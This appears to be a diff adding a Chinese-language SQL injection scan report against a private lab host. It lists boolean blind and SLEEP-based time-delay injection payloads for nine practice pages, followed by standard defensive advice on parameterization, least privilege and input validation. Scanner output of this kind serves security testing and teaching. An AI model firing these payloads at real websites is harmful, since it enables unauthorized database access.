@@ -1,0 +1,121 @@
+目标：http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'76581'='76581
+'	and	'81785'='81785
+'	or	93840=93840#
+'	and	'8328'='8329
+---
+
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'76581'='76581
+'	and	'81785'='81785
+'	or	93840=93840#
+'	and	'8328'='8329
+---
+
+---
+URL:http://192.168.42.133/sqli/example4.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 	and	15664=15664
+	and	54736=54736
+	or	35314=35314#
+	and	88393=88394
+---
+
+---
+URL:http://192.168.42.133/sqli/example5.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 	and	15664=15664
+	and	54736=54736
+	or	35314=35314#
+	and	88393=88394
+---
+
+---
+URL:http://192.168.42.133/sqli/example3.php (GET)
+漏洞名称: blind sqli
+Query: {'name': 'root'}
+Payload: '/**/and/**/'8966'='8966
+'/**/and/**/'89504'='89504
+'/**/or/**/60363=60363#
+'/**/and/**/'40646'='40647
+---
+
+---
+URL:http://192.168.42.133/sqli/example6.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 	and	15664=15664
+	and	54736=54736
+	or	35314=35314#
+	and	88393=88394
+---
+
+---
+URL:http://192.168.42.133/sqli/example7.php (GET)
+漏洞名称: blind sqli
+Query: {'id': '2'}
+Payload: 
+and
+15928=15928
+
+and
+58789=58789
+
+or
+31168=31168#
+
+and
+3350=3351
+---
+
+---
+URL:http://192.168.42.133/sqli/example8.php (GET)
+漏洞名称: time delay sqli vuln
+Query: {'order': 'name'}
+Payload: ` or SLEEP(3);-- 
+---
+
+---
+URL:http://192.168.42.133/sqli/example9.php (GET)
+漏洞名称: time delay sqli vuln
+Query: {'order': 'name'}
+Payload:  or SLEEP(3);-- 
+---
+
+    防御SQL注入漏洞的建议：
+
+    [1] 库或框架
+
+        使用能够防御SQL注入漏洞的库或框架。
+
+    [2] 参数化
+
+        尽量使用自动实施数据和代码之间的分离的结构化机制。
+        这些机制也能够自动提供相关引用、编码和验证，而不是依赖于开发者在生成输出的每一处提供此能力。
+
+    [3] 环境固化
+
+        使用完成必要任务所需的最低特权来运行代码。
+
+    [4] 输出编码
+
+        如果在有风险的情况下仍需要使用动态生成的查询字符串或命令，请对参数正确地加引号并将这些参数中的任何特殊字符转义。
+
+    [5] 输入验证
+
+        假定所有输入都是恶意的。
+        使用“接受已知善意”输入验证策略：严格遵守规范的可接受输入的白名单。
+        拒绝任何没有严格遵守规范的输入，或者将其转换为遵守规范的内容。
+        不要完全依赖于通过黑名单检测恶意或格式错误的输入。但是，黑名单可帮助检测潜在攻击，或者确定哪些输入格式不正确，以致应当将其彻底拒绝。
+
+    
